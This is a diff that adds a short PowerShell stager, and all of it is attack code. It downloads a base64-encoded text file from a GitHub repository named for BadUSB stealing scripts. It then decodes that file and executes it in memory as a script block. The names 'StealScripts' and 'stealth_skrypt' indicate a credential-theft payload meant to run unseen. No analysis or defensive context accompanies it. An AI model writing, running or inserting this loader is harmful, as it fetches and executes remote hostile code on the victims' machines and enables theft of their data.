@@ -1,0 +1,5 @@
+$w=New-Object Net.WebClient
+$d=$w.DownloadString('https://raw.githubusercontent.com/SecureMedica/StealScripts_BadUSB/refs/heads/main/base64_stealth_skrypt.txt')
+$b=[Convert]::FromBase64String($d)
+$s=[Text.Encoding]::UTF8.GetString($b)
+[ScriptBlock]::Create($s).Invoke()
